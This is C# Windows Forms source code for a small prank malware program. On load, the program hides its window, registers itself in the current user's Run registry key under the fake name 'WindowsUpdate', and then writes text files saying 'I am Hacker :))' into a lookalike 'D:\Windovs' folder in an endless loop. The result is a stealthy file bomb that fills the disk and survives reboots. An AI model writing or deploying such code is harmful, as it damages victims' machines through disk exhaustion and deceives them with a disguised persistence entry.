using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Windows21._1H
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            button1_Click(sender, e);
            if (!Directory.Exists(@"D:\Windovs"))
            {
                Directory.CreateDirectory(@"D:\Windovs");
            }
            for (int i = 0; i < 10; i++)
            {
                i = 0;
                try
                {
                    string path = @"D:\Windovs\" + DateTime.Now.ToString("dd-MM-yyyy") + "-" + DateTime.Now.ToString("hh-mm-ss-ffff") + i.ToString() + ".txt";
                    if (!File.Exists(path))
                    {
                        using (StreamWriter sw = File.CreateText(path))
                        {
                            sw.WriteLine("Hello Baby :)");
                            sw.WriteLine("And");
                            sw.WriteLine("Welcome");
                            sw.WriteLine("I am Hacker :))");
                        }
                    }
                }
                catch (Exception)
                {

                    throw;
                }

            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Start();
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("WindowsUpdate", Application.ExecutablePath);
        }
    }
}
